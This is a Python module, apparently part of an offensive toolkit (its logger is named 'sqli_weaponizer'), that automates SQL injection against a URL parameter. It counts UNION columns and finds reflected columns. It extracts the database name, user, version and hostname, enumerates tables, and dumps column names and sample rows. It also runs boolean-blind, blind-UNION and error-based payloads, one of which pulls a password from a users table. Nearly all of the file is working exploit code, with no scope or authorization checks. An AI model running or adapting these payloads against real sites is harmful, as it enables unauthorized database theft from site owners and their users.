import re
from typing import Dict, List, Optional

import requests

from tools._session import make_session
from tools.log_utils import get_logger

logger = get_logger("sqli_weaponizer")


def _build_url(url: str, param: str, payload: str) -> str:
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}{param}={payload}"


def _try(url: str, param: str, payload: str, sess: requests.Session,
         timeout: float) -> Optional[requests.Response]:
    try:
        return sess.get(_build_url(url, param, payload), timeout=timeout)
    except Exception as e:
        logger.debug("weaponizer req: %s", e)
        return None


def _probe_column_count(url: str, param: str, sess: requests.Session,
                        timeout: float) -> int:
    """Column count via UNION SELECT NULL,N...  (quoted + unquoted prefixes).

    Returns the smallest n whose NULL-union response is clean (no error),
    or 0 when no prefix/width succeeds.
    """
    prefixes = ["'", "", '"']
    for prefix in prefixes:
        for n in [1, 2, 3, 4, 5, 6, 7, 8, 10, 12, 15, 20]:
            payload = "%s UNION SELECT %s-- " % (prefix, ",".join(["NULL"] * n))
            r = _try(url, param, payload, sess, timeout)
            if r is None:
                continue
            body = r.text.lower()
            if r.status_code == 200 and "error" not in body \
                    and "unexpected" not in body \
                    and "different number of columns" not in body \
                    and "column count" not in body \
                    and "doesn't match" not in body \
                    and r.text != "":
                return n
    return 0


def _find_reflection_points(url: str, param: str, cols: int,
                            sess: requests.Session, timeout: float) -> List[int]:
    """Unique-marker probing: which UNION columns are rendered back?"""
    points = []
    for col in range(1, cols + 1):
        parts = ["NULL"] * cols
        marker = "RFLCT_%d" % col
        parts[col - 1] = "'%s'" % marker
        for prefix in ("'", ""):
            payload = "%s UNION SELECT %s-- " % (prefix, ",".join(parts))
            r = _try(url, param, payload, sess, timeout)
            if r is not None and r.status_code == 200 and marker in r.text:
                points.append(col)
                break
    return points


def _extract_from_response(text: str) -> List[str]:
    """Pull plausible string values out of a union-rendered response."""
    vals = re.findall(r"[A-Za-z0-9_@.\-:]{3,}", text or "")
    seen, out = set(), []
    for v in vals:
        if v.lower() in ("html", "body", "http", "https", "normal", "response",
                         "product", "content", "type", "text", "div", "span"):
            continue
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out[:10]


def _extract_via_union(url: str, param: str, cols: int, reflection_points: List[int],
                       sess: requests.Session, timeout: float) -> list:
    """Place DATABASE()/USER()/VERSION() into a reflected column and harvest.

    Also enumerates tables (GROUP_CONCAT) when a reflection point exists.
    """
    data = []
    if not reflection_points:
        return data
    col = reflection_points[0]
    funcs = [
        ("database", "DATABASE()"),
        ("user", "USER()"),
        ("version", "VERSION()"),
        ("current_user", "CURRENT_USER()"),
        ("hostname", "@@HOSTNAME"),
    ]
    for label, expr in funcs:
        parts = ["NULL"] * cols
        parts[col - 1] = expr
        payload = "' UNION SELECT %s-- " % ",".join(parts)
        r = _try(url, param, payload, sess, timeout)
        if r is None:
            continue
        vals = _extract_from_response(r.text)
        # Prefer values shaped like db / user@host / dotted versions.
        shape = None
        for v in vals:
            if re.search(r"[a-zA-Z0-9_]+@[a-zA-Z0-9_.\-:]+|\d+\.\d+\.\d+", v):
                shape = v
                break
        if shape:
            data.append({"source": "union_%s" % label, "value": shape[:100]})
        elif vals:
            data.append({"source": "union_%s" % label, "values": vals})

    # Table enumeration: DBMS-aware query candidates, tried in order.
    dbms = _guess_dbms_from_data(data)
    noise = ("html", "body", "group", "concat", "table", "name", "information",
              "schema", "tables", "from", "where", "select", "null", "database",
              "current", "user", "version", "hostname", "string", "sys", "top")
    table_queries = _table_enum_queries(dbms)
    for qexpr in table_queries:
        parts = ["NULL"] * cols
        parts[col - 1] = "(%s)" % qexpr
        payload = "' UNION SELECT %s-- " % ",".join(parts)
        r = _try(url, param, payload, sess, timeout)
        if r is None:
            continue
        tables = re.findall(r"[a-zA-Z_][a-zA-Z0-9_]{2,}", r.text or "")
        tables = [t for t in tables if t.lower() not in noise]
        tables = list(dict.fromkeys(tables))
        if len(tables) >= 2:
            data.append({"source": "union_tables", "dbms": dbms,
                         "values": tables[:15]})
            break
    return data


def _guess_dbms_from_data(data: list) -> str:
    """Infer DBMS from extracted version/user strings."""
    blob = " ".join(str(d).lower() for d in data)
    if "mariadb" in blob or "mysql" in blob:
        return "MySQL"
    if "postgres" in blob:
        return "PostgreSQL"
    if "microsoft" in blob or "sql server" in blob or "mssql" in blob:
        return "MSSQL"
    if "oracle" in blob:
        return "Oracle"
    if "sqlite" in blob:
        return "SQLite"
    return ""


def _table_enum_queries(dbms: str) -> list:
    """Candidate SELECT expressions that yield table names (by DBMS)."""
    generic = [
        "SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES "
        "WHERE TABLE_SCHEMA=DATABASE()",
        "SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES",
        "SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'",
        "SELECT STRING_AGG(table_name, ',') FROM information_schema.tables "
        "WHERE table_schema=current_schema()",
        "SELECT TOP 5 name FROM sys.tables",
        "SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) "
        "FROM all_tables WHERE owner=USER",
    ]
    by_dbms = {
        "MySQL": generic[:2],
        "PostgreSQL": ["SELECT STRING_AGG(table_name, ',') FROM "
                       "information_schema.tables WHERE table_schema=current_schema()"],
        "MSSQL": ["SELECT STRING_AGG(name, ',') FROM sys.tables",
                  "SELECT TOP 5 name FROM sys.tables"],
        "Oracle": ["SELECT LISTAGG(table_name, ',') WITHIN GROUP "
                   "(ORDER BY table_name) FROM all_tables WHERE owner=USER"],
        "SQLite": ["SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'"],
    }
    if dbms and dbms in by_dbms:
        seen = set()
        out = []
        for q in by_dbms[dbms] + generic:
            if q not in seen:
                seen.add(q)
                out.append(q)
        return out
    return generic


def _condition_tester(url: str, param: str, sess: requests.Session, timeout: float):
    """Return fn(condition)->bool usable for boolean-blind extraction."""
    baseline = None
    for probe in ("1", "'1'"):
        r = _try(url, param, "%s-- " % probe, sess, timeout)
        if r is not None and r.status_code == 200:
            baseline = len(r.text)
            break

    def _test(condition: str) -> bool:
        for prefix in ("' AND %s-- ", "' OR %s-- ", "1 AND %s-- ",
                       '" AND %s-- ', "\" OR %s-- "):
            r = _try(url, param, prefix % condition, sess, timeout)
            if r is None:
                continue
            if baseline is not None:
                # true-condition responses should deviate from the false page
                if r.status_code == 200 and abs(len(r.text) - baseline) > 25:
                    return True
            else:
                if r.status_code == 200 and len(r.text) > 20:
                    return True
        return False

    return _test


def _extract_char(query: str, pos: int, test_fn) -> Optional[str]:
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if test_fn("ASCII(SUBSTRING((%s),%d,1))>%d" % (query, pos, mid)):
            low = mid + 1
        else:
            high = mid - 1
    if 32 <= low <= 126:
        return chr(low)
    return None


def _extract_via_blind(url: str, param: str, sess: requests.Session,
                       timeout: float, max_len: int = 24) -> list:
    """Boolean-blind extraction of database/user/version (binary search)."""
    test_fn = _condition_tester(url, param, sess, timeout)
    if not test_fn("1=1") or test_fn("1=2"):
        return []
    queries = [
        ("database", "SELECT DATABASE()"),
        ("user", "SELECT USER()"),
        ("version", "SELECT VERSION()"),
    ]
    data = []
    for label, query in queries:
        extracted = ""
        for pos in range(1, max_len + 1):
            ch = _extract_char(query, pos, test_fn)
            if ch is None:
                break
            if ch == " " and extracted.endswith(" "):
                # two consecutive blanks = end of string
                break
            extracted += ch
        extracted = extracted.rstrip()
        if len(extracted) >= 3:
            data.append({"source": "blind_%s" % label, "value": extracted})
    return data


def _union_expr(first_expr: str, cols: int) -> str:
    """'IF(...)' followed by (cols-1) NULLs - no trailing comma."""
    if cols <= 1:
        return first_expr
    return "%s, %s" % (first_expr, ", ".join(["NULL"] * (cols - 1)))


def _extract_via_blind_union(url: str, param: str, cols: int,
                             sess: requests.Session, timeout: float,
                             max_len: int = 16) -> list:
    """Blind UNION extraction: IF(cond,1,2) in col 1, rest NULL.

    No reflection needed - the row presence/absence is the oracle.
    """
    def _test(condition: str) -> bool:
        payload = "' UNION SELECT %s-- " % _union_expr("IF((%s),1,2)" % condition, cols)
        r = _try(url, param, payload, sess, timeout)
        if r is None:
            return False
        # Union returns an extra row when true -> body grows / differs.
        return r.status_code == 200 and len(r.text) > 30

    # Baseline: false condition must be shorter than true condition.
    base_false = _try(url, param,
                      "' UNION SELECT %s-- " % _union_expr("IF((1=2),1,2)", cols),
                      sess, timeout)
    base_true = _try(url, param,
                     "' UNION SELECT %s-- " % _union_expr("IF((1=1),1,2)", cols),
                     sess, timeout)
    if base_false is None or base_true is None:
        return []
    if len(base_true.text) <= len(base_false.text):
        return []
    threshold = (len(base_true.text) + len(base_false.text)) // 2

    def _test_gt(condition: str) -> bool:
        r = _try(url, param,
                 "' UNION SELECT %s-- " % _union_expr("IF((%s),1,2)" % condition, cols),
                 sess, timeout)
        return r is not None and len(r.text) > threshold

    data = []
    for label, query in [("database", "SELECT DATABASE()"), ("user", "SELECT USER()")]:
        extracted = ""
        for pos in range(1, max_len + 1):
            ch = _extract_char(query, pos, _test_gt)
            if ch is None:
                break
            if ch == " " and extracted.endswith(" "):
                break
            extracted += ch
        extracted = extracted.rstrip()
        if len(extracted) >= 3:
            data.append({"source": "blind_union_%s" % label, "value": extracted})
    return data


def _extract_table_data(url: str, param: str, cols: int, reflection_points: List[int],
                           table: str, sess: requests.Session,
                           timeout: float) -> list:
    """Given a table name, enumerate its columns then dump sample rows
    through the first reflected UNION column (DBMS-agnostic best effort)."""
    if not reflection_points:
        return []
    col = reflection_points[0]
    data = []
    noise2 = ("html", "body", "table", "name", "information", "schema",
               "columns", "from", "where", "select", "null", "database",
               "column", "group", "concat", "listagg", "pragma", "row")
    col_queries = [
        "(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS "
        "WHERE TABLE_NAME='%s')" % table,
        "(SELECT STRING_AGG(COLUMN_NAME, ',') FROM INFORMATION_SCHEMA.COLUMNS "
        "WHERE TABLE_NAME='%s')" % table,
        "(SELECT LISTAGG(COLUMN_NAME, ',') WITHIN GROUP (ORDER BY COLUMN_ID) "
        "FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='%s')" % table,
        "(SELECT GROUP_CONCAT(name) FROM pragma_table_info('%s'))" % table,
    ]
    columns = []
    for qexpr in col_queries:
        parts = ["NULL"] * cols
        parts[col - 1] = qexpr
        r = _try(url, param, "' UNION SELECT %s-- " % ",".join(parts), sess, timeout)
        if r is None:
            continue
        found = re.findall(r"[a-zA-Z_][a-zA-Z0-9_]{2,}", r.text or "")
        found = [f for f in found if f.lower() not in noise2]
        found = list(dict.fromkeys(found))
        if len(found) >= 1:
            columns = found
            break
    if not columns:
        return data
    data.append({"source": "table_columns", "table": table, "columns": columns[:10]})

    # Row dump: CONCAT_WS('|', col...) then GROUP_CONCAT with newline separator.
    expr = "CONCAT_WS('|',%s)" % ",".join(columns)
    row_queries = [
        "(SELECT GROUP_CONCAT(%s SEPARATOR 0x0a) FROM (SELECT %s FROM %s LIMIT 5) t)" % (expr, expr, table),
        "(SELECT GROUP_CONCAT(%s) FROM %s)" % (expr, table),
    ]
    for qexpr in row_queries:
        parts = ["NULL"] * cols
        parts[col - 1] = qexpr
        r = _try(url, param, "' UNION SELECT %s-- " % ",".join(parts), sess, timeout)
        if r is None:
            continue
        # Rows are pipe-delimited blocks; harvest plausible cell values.
        rows = re.findall(r"[A-Za-z0-9_@.\-:/ ]{3,}", r.text or "")
        cells = []
        for token in rows:
            t = token.strip()
            if t.lower() in noise2 or t.lower() in ("html", "body", "page"):
                continue
            if "|" in t or any(c.isdigit() for c in t):
                cells.append(t[:60])
            if len(cells) >= 6:
                break
        if cells:
            data.append({"source": "table_rows", "table": table, "rows": cells})
            break
    return data


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    sess = sess or make_session()
    result = {"vulnerable": False, "data": [], "type": None,
              "column_count": None, "reflection_points": []}

    cols = _probe_column_count(url, param, sess, timeout)
    result["column_count"] = cols

    if cols:
        points = _find_reflection_points(url, param, cols, sess, timeout)
        result["reflection_points"] = points
        if points:
            extracted = _extract_via_union(url, param, cols, points, sess, timeout)
            if extracted:
                result["vulnerable"] = True
                result["data"].extend(extracted)
                result["type"] = "union"
                # Deep-dive: dump columns + rows of the first enumerated table.
                tables = []
                for d in extracted:
                    if d.get("source") == "union_tables" and d.get("values"):
                        tables = d["values"]
                        break
                if tables:
                    result["data"].extend(_extract_table_data(
                        url, param, cols, points, tables[0], sess, timeout))
        else:
            # Column count proven but no reflection: blind union extraction.
            blind_union = _extract_via_blind_union(url, param, cols, sess, timeout)
            if blind_union:
                result["vulnerable"] = True
                result["data"].extend(blind_union)
                result["type"] = "blind_union"

    if not result["vulnerable"]:
        blind = _extract_via_blind(url, param, sess, timeout)
        if blind:
            result["vulnerable"] = True
            result["data"].extend(blind)
            result["type"] = "boolean_blind"

    if not result["vulnerable"]:
        error_payloads = [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))-- ",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER())))-- ",
            "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)-- ",
        ]
        for payload in error_payloads:
            r = _try(url, param, payload, sess, timeout)
            if r is None:
                continue
            m = re.search(r"~(.+?)[\\\"']", r.text or "")
            if m:
                result["vulnerable"] = True
                result["data"].append({"source": "error_based", "value": m.group(1)[:100]})
                result["type"] = "error_based"
                break

    return result
